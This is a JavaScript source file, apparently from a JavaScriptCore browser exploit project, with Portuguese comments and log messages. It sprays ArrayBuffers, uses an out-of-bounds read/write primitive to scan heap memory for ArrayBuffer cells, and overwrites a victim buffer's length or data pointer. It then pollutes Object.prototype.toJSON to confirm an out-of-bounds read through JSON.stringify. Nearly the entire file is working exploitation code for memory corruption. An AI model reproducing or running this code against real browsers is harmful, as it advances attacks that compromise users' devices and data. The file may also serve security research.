// js/script3/testCorruptArrayBufferStructure.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3, LONG_PAUSE_S3 } from './s3_utils.mjs'; // Agora LONG_PAUSE_S3 será encontrado
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';
import { detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice, currentCallCount_for_UAF_TC_test } from './testJsonTypeConfusionUAFSpeculative.mjs';


const CORRUPTION_AB_CONFIG = {
    spray_count: 200,
    victim_ab_size: 64,
    search_base_address_str: "0x200000000", // !! AJUSTAR !! Base de busca na heap JS
    search_range_bytes: 0x200000,         // !! AJUSTAR !! Ex: 2MB
    search_step_bytes: 0x10,              // Alinhamento (tamanho comum de célula JSC)

    STRUCTURE_ID_OFFSET_IN_CELL: JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET,
    CONTENTS_IMPL_POINTER_OFFSET_IN_CELL: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET,
    DATA_POINTER_OFFSET_IN_CONTENTS: JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET,
    SIZE_OFFSET_IN_CONTENTS: JSC_OFFSETS.ArrayBufferContents.SIZE_OFFSET,

    new_corrupted_size_value: 0x1000, 
    new_corrupted_data_ptr_val_str: "0x4242424242424242", 

    max_candidates_to_log: 5,
    max_corruptions_to_attempt: 1, 
    corrupt_target: "size", // "size" ou "data_pointer"
};

let victimAbsForCorruptionTest = []; 

function sprayArrayBuffersLocal(count, size, logFn = logS3) {
    victimAbsForCorruptionTest = []; 
    logFn(`Pulverizando ${count} ArrayBuffers de ${size} bytes...`, "info", "sprayABsLocal");
    for (let i = 0; i < count; i++) {
        try {
            victimAbsForCorruptionTest.push(new ArrayBuffer(size));
        } catch (e) {
            logFn(`Falha ao alocar ArrayBuffer de spray ${i + 1}/${count}: ${e.message}`, "warn", "sprayABsLocal");
            if (victimAbsForCorruptionTest.length < count / 2) return false; 
        }
    }
    logFn(`${victimAbsForCorruptionTest.length} ArrayBuffers pulverizados.`, "good", "sprayABsLocal");
    return true;
}


export async function testCorruptArrayBufferStructure() {
    const FNAME = "testCorruptArrayBufferStructure";
    logS3(`==== INICIANDO Teste de Corrupção de Estrutura ArrayBuffer ====`, 'test', FNAME);
    document.title = "Iniciando Corrupção AB Estrutura";

    let successfulCorruptionsFound = 0;

    if (!sprayArrayBuffersLocal(CORRUPTION_AB_CONFIG.spray_count, CORRUPTION_AB_CONFIG.victim_ab_size)) {
        logS3("Falha na pulverização inicial. Abortando.", "error", FNAME);
        return;
    }
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    await triggerOOB_primitive();
    if (!oob_array_buffer_real || !oob_dataview_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
        return;
    }
    logS3("Ambiente OOB configurado para busca e corrupção.", "info", FNAME);
    document.title = "OOB OK, Buscando ABs...";

    const searchBaseAddr = new AdvancedInt64(CORRUPTION_AB_CONFIG.search_base_address_str);
    const searchEndAddr = searchBaseAddr.add(new AdvancedInt64(CORRUPTION_AB_CONFIG.search_range_bytes));
    let candidatesLogged = 0;

    logS3(`Iniciando busca por ArrayBuffers de ${searchBaseAddr.toString(true)} a ${searchEndAddr.toString(true)}`, "info", FNAME);
    logS3(`Alvo de Corrupção: ${CORRUPTION_AB_CONFIG.corrupt_target}`, "info", FNAME);

    for (let currentCellAddr = searchBaseAddr;
         currentCellAddr.lessThan(searchEndAddr) && successfulCorruptionsFound < CORRUPTION_AB_CONFIG.max_corruptions_to_attempt;
         currentCellAddr = currentCellAddr.add(new AdvancedInt64(CORRUPTION_AB_CONFIG.search_step_bytes)))
    {
        if (currentCellAddr.low() % (CORRUPTION_AB_CONFIG.search_range_bytes / 20) < CORRUPTION_AB_CONFIG.search_step_bytes ) {
             document.title = `Buscando... ${currentCellAddr.toString(true)}`;
             await PAUSE_S3(SHORT_PAUSE_S3); 
        }

        try {
            const structureIDValAddr = currentCellAddr.add(CORRUPTION_AB_CONFIG.STRUCTURE_ID_OFFSET_IN_CELL);
            const candidateStructureID_raw = oob_read_absolute(structureIDValAddr, 4); 

            if (typeof candidateStructureID_raw !== 'number' || candidateStructureID_raw === 0) continue; 

            if (KNOWN_STRUCTURE_IDS && typeof KNOWN_STRUCTURE_IDS.ArrayBuffer === 'number') {
                if (candidateStructureID_raw !== KNOWN_STRUCTURE_IDS.ArrayBuffer) {
                    continue; 
                }
            } else {
                 if (candidatesLogged < CORRUPTION_AB_CONFIG.max_candidates_to_log && currentCellAddr.low() % (1024*32) === 0) {
                    logS3(`  Candidato em ${currentCellAddr.toString(true)} com ID Low32: ${toHex(candidateStructureID_raw)}. KNOWN_STRUCTURE_IDS.ArrayBuffer NÃO DEFINIDO ou NÃO É NÚMERO. Verificação de ID pulada.`, "warn", FNAME);
                 }
            }

            logS3(`[CANDIDATO AB?] ${currentCellAddr.toString(true)} (ID: ${toHex(candidateStructureID_raw)})`, "vuln", FNAME);
            document.title = `Candidato AB ${currentCellAddr.toString(true)}`;

            const contentsImplPtrAddr = currentCellAddr.add(CORRUPTION_AB_CONFIG.CONTENTS_IMPL_POINTER_OFFSET_IN_CELL);
            const contentsImplPtr = oob_read_absolute(contentsImplPtrAddr, 8);
            if (!isAdvancedInt64Object(contentsImplPtr) || contentsImplPtr.equals(new AdvancedInt64(0))) {
                logS3(`  Falha ao ler m_impl válido em ${contentsImplPtrAddr.toString(true)}. Pulando.`, "warn", FNAME);
                continue;
            }
            logS3(`  m_impl (ArrayBufferContents*) lido de ${contentsImplPtrAddr.toString(true)}: ${contentsImplPtr.toString(true)}`, "info", FNAME);

            const sizeFieldAddrInContents = contentsImplPtr.add(CORRUPTION_AB_CONFIG.SIZE_OFFSET_IN_CONTENTS);
            const originalSizeInContents_adv64 = oob_read_absolute(sizeFieldAddrInContents, 8); 
            if (!isAdvancedInt64Object(originalSizeInContents_adv64)) {
                 logS3(`  Falha ao ler tamanho original de ${sizeFieldAddrInContents.toString(true)}. Pulando.`, "warn", FNAME);
                continue;
            }
            const originalSizeInContents_num = originalSizeInContents_adv64.low(); 
            logS3(`  Tamanho original lido de [m_impl + SIZE_OFFSET]: ${originalSizeInContents_num} bytes em ${sizeFieldAddrInContents.toString(true)}`, "info", FNAME);

            if (originalSizeInContents_num !== CORRUPTION_AB_CONFIG.victim_ab_size) {
                logS3(`  Tamanho original (${originalSizeInContents_num}) != esperado (${CORRUPTION_AB_CONFIG.victim_ab_size}). Pulando.`, "warn", FNAME);
                continue;
            }
            logS3(`  Candidato ${currentCellAddr.toString(true)} corresponde ao tamanho esperado!`, "good", FNAME);

            if (CORRUPTION_AB_CONFIG.corrupt_target === "size") {
                logS3(`  >>> CORROMPENDO TAMANHO em ${sizeFieldAddrInContents.toString(true)} para ${toHex(CORRUPTION_AB_CONFIG.new_corrupted_size_value)} <<<`, "critical", FNAME);
                document.title = `Corrompendo Tam ${sizeFieldAddrInContents.toString(true)}`;
                oob_write_absolute(sizeFieldAddrInContents, new AdvancedInt64(CORRUPTION_AB_CONFIG.new_corrupted_size_value), 8);
            } else if (CORRUPTION_AB_CONFIG.corrupt_target === "data_pointer") {
                const dataPtrFieldAddrInContents = contentsImplPtr.add(CORRUPTION_AB_CONFIG.DATA_POINTER_OFFSET_IN_CONTENTS);
                const newDataPtr = new AdvancedInt64(CORRUPTION_AB_CONFIG.new_corrupted_data_ptr_val_str);
                logS3(`  >>> CORROMPENDO PONTEIRO DE DADOS em ${dataPtrFieldAddrInContents.toString(true)} para ${newDataPtr.toString(true)} <<<`, "critical", FNAME);
                document.title = `Corrompendo Ptr ${dataPtrFieldAddrInContents.toString(true)}`;
                oob_write_absolute(dataPtrFieldAddrInContents, newDataPtr, 8);
            } else {
                logS3(`  Alvo de corrupção desconhecido: ${CORRUPTION_AB_CONFIG.corrupt_target}. Pulando corrupção.`, "error", FNAME);
                continue;
            }
            await PAUSE_S3(SHORT_PAUSE_S3);

            let corruptionVerifiedForThisCandidate = false;
            for (let i = 0; i < victimAbsForCorruptionTest.length; i++) {
                const currentVictimAB = victimAbsForCorruptionTest[i];
                if (CORRUPTION_AB_CONFIG.corrupt_target === "size") {
                    if (currentVictimAB.byteLength === CORRUPTION_AB_CONFIG.new_corrupted_size_value) {
                        logS3(`  !!!!!! SUCESSO: ArrayBuffer[${i}] byteLength AGORA É ${currentVictimAB.byteLength} !!!!!!`, "leak", FNAME);
                        logS3(`     Endereço do JSCell corrompido (especulativo): ${currentCellAddr.toString(true)}`, "leak", FNAME);
                        document.title = `SUCESSO Corrupção Tam AB ${i}!`;
                        successfulCorruptionsFound++;
                        corruptionVerifiedForThisCandidate = true;

                        logS3(`     Chamando JSON.stringify no ArrayBuffer[${i}] corrompido...`, "test", FNAME);
                        currentCallCount_for_UAF_TC_test = 0; 
                        try {
                           let ppKeyToPollute = 'toJSON';
                           let originalToJSONDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
                           Object.defineProperty(Object.prototype, ppKeyToPollute, { value: detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice, writable:true, configurable:true, enumerable: false});
                           let res = JSON.stringify(currentVictimAB);
                           logS3(`     Resultado do stringify: ${String(res).substring(0,700)}`, "info", FNAME);
                           if (String(res).includes("Leitura estendida bem-sucedida") || String(res).includes("Leitura ESPECULATIVA em") && String(res).includes("bem-sucedida")) {
                               logS3("     !!!!!! LEITURA OOB CONFIRMADA VIA JSON.STRINGIFY !!!!!!", "critical", FNAME);
                           }
                           if (originalToJSONDesc) Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDesc); else delete Object.prototype[ppKeyToPollute];
                        } catch (e_stringify) {
                           logS3(`     Erro ao chamar stringify no AB corrompido: ${e_stringify.message}`, "error", FNAME);
                        }
                        break;
                    }
                } else if (CORRUPTION_AB_CONFIG.corrupt_target === "data_pointer") {
                    try {
                        let tempView = new Uint8Array(currentVictimAB);
                        logS3(`  ArrayBuffer[${i}] acessível após corrupção de ponteiro de dados. 1º byte: ${tempView[0] ? toHex(tempView[0]) : 'N/A'}. Verifique manualmente.`, "warn", FNAME);
                        document.title = `SUCESSO Corrupção Ptr AB ${i}?`;
                        successfulCorruptionsFound++;
                        corruptionVerifiedForThisCandidate = true;
                        break;
                    } catch (e_access_corrupted_ptr) {
                        logS3(`  !!! CRASH ESPERADO/INTERESSANTE após corrupção de ponteiro para AB[${i}]: ${e_access_corrupted_ptr.message}`, "critical", FNAME);
                        document.title = `CRASH Ptr AB ${i}!`;
                        successfulCorruptionsFound++;
                        corruptionVerifiedForThisCandidate = true;
                        break;
                    }
                }
            }

            if (!corruptionVerifiedForThisCandidate && CORRUPTION_AB_CONFIG.corrupt_target === "size") {
                logS3(`  Corrupção de tamanho em ${sizeFieldAddrInContents.toString(true)} não refletiu. Restaurando...`, "warn", FNAME);
                oob_write_absolute(sizeFieldAddrInContents, originalSizeInContents_adv64, 8); 
            }
            
            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_corruptions_to_attempt) break;

        } catch (e_search_loop) {
            if (typeof e_search_loop.message === 'string' && e_search_loop.message.includes("bounds")) {
                // Silently ignore OOB read errors from the search itself
            } else {
                logS3(`  Erro no loop de busca/corrupção em ${currentCellAddr.toString(true)}: ${e_search_loop.name} - ${e_search_loop.message}`, "error", FNAME);
            }
        }
    }

    document.title = "Busca/Corrupção Concluída";
    logS3(`Busca na memória concluída. Corrupções efetivas encontradas e testadas: ${successfulCorruptionsFound}.`, "info", FNAME);
    victimAbsForCorruptionTest = []; 
    clearOOBEnvironment();
    logS3(`==== Teste de Corrupção de Estrutura ArrayBuffer CONCLUÍDO ====`, 'test', FNAME);
}
